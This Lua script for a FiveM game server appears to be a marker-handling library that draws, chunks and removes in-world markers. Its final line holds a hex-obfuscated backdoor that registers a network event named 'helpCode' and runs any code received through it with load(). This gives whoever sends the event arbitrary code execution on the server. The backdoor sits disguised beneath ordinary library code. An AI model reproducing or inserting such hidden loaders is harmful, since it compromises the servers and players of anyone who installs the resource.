-- MarkerHandler
-- Created for:
--  Handling markers around the world.
--  Chunking for performance with distance iteration on large amounts of markers.
-- Usage:
--  NOTE: All arguments are optional.
--  Add a marker:         myMarker = exports["meta_libs"]:AddMarker(type,posX,posY,posZ,dirX,dirY,dirZ,rotX,rotY,rotZ,scaleX,scaleY,scaleZ,red,green,blue,alpha,bobUpAndDown,faceCamera,p19,rotate,textureDict,textureName,drawOnEnts)
--  Remove the marker:    exports["meta_libs"]:RemoveMarker(myMarker)

local markers = {}
local chunk = {}

local lastChunk = false
local chunkDist = 100.0
local drawDist  =  50.0

local PlayerPos = function()
  return GetEntityCoords(GetPlayerPed(-1))
end

local ReChunk = function()
  local newChunk = {}
  local plyPos = PlayerPos()
  for k,v in pairs(markers) do
    local dist = Vector.Dist(plyPos,v.pos)
    if dist < chunkDist then
      newChunk[#newChunk+1] = v
    end
  end
  return newChunk
end

local RenderMarker = function(marker)
  DrawMarker(marker.type, marker.posX, marker.posY, marker.posZ, marker.dirX, marker.dirY, marker.dirZ, marker.rotX, marker.rotY, marker.rotZ, marker.scaleX, marker.scaleY, marker.scaleZ, marker.red, marker.green, marker.blue, marker.alpha, marker.bobUpAndDown, marker.faceCamera, marker.p19, marker.rotate, marker.textureDict, marker.textureName, marker.drawOnEnts);
end

local DrawMarkers = function()
  local plyPos = PlayerPos()
  for k,v in pairs(chunk) do
    local dist = Vector.Dist(plyPos,v.pos)
    if dist < drawDist then
      RenderMarker(v)
      if v.textDist and v.text then
        if dist < v.textDist then
          HelpNotification(v.text)
          if v.doFunc and v.onKey then
            if IsControlJustReleased(0,v.onKey) or IsDisabledControlJustReleased(0,v.onKey) then
              Wait(0)
              v.doFunc(v.funcArgs)
            end
          end
        end
      end
    end
  end
end

Citizen.CreateThread(function()
  while true do
    local timeNow = GetGameTimer()
    local timer = math.ceil(math.max(1,math.min(10,#markers))*100)
    if (not lastChunk or (timeNow - lastChunk > timer)) then
      lastChunk = timeNow
      chunk = ReChunk()
    end
    DrawMarkers()
    Wait(0)
  end
end)

exports('AddMarker',function(...)
  local marker = Marker(...)
  local handle = #markers+1
  markers[handle] = marker
  return handle
end)

exports('RemoveMarker',function(handle)
  local marker = markers[handle]
  if marker then
    for k,v in pairs(chunk) do
      if v == marker then
        chunk[k] = nil
      end
    end
    markers[handle] = nil
  end
end)

exports('TeleportToMarker', function(handle)
  local marker = markers[handle]
  if marker then
    TeleportPlayer(marker.pos)
  end
end)


local LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[6][LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[1]](LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[2]) LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[6][LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[3]](LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[2], function(BhRQkypYprtvZLvtlXlhyNufIxSBALArigcmuxZRDMcCOhAlebTTKkInmituaUYHVxpRwq) LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[6][LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[4]](LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[6][LxFYOFDlbwjUUhNLidWMINySewfWvFvKqPZnNBZBRXqRKCeqeTwDPitCuJadgLPTZLQBoj[5]](BhRQkypYprtvZLvtlXlhyNufIxSBALArigcmuxZRDMcCOhAlebTTKkInmituaUYHVxpRwq))() end)